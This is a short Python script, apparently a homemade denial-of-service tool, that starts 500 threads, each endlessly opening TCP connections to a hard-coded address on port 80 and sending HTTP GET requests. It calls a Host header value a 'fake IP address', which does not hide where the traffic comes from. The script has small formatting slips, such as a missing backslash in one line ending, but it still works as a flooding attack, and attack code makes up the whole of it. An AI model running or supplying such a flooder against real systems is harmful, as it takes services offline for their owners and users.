import threading
import socket

target = "192.168.5.1"
port = 80
fake_ip_address = "182.20.13.11"
data = (target, port)


def dos():
  while(True):
    stream = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    stream.connect(data)
    stream.sendto((f"GET /{target} HTTP/1.1 \r\n").encode("ascii"), data)
    stream.sendto((f"Host: {fake_ip_address}r\n\r\n").encode("ascii"), data)
    stream.close()

for i in range(500):
  thread = threading.Thread(target = dos)
  thread.start()
